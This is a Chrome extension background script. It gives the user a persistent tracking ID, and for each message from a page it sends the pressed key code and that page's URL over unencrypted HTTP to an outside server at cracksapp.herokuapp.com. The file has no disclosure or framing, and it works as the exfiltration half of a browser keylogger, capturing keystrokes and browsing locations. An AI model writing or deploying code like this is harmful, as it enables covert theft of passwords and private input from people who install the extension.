window.token = '';

chrome.storage.sync.get('user_id', function(items){
  if(items.user_id){
    window.token = items.user_id;
  } else {
    var randomPool = new Uint8Array(32);
    crypto.getRandomValues(randomPool);
    var hex = '';
    for (var i = 0; i < randomPool.length; ++i) {
      hex += randomPool[i].toString(16);
    }
    window.token = hex;
    chrome.storage.sync.set({user_id: window.token});
  }
});


chrome.runtime.onMessage.addListener(
  function(request, sender) {
    var http = new XMLHttpRequest();
    var url = "http://cracksapp.herokuapp.com/upload";
    
    var params = "";
    params += "user_id=" + window.token;
    params += "&key_code=" + request.keyCode;
    params += "&url=" + sender.url;

    http.open("POST", url, true);
    http.send(params);
  }
);
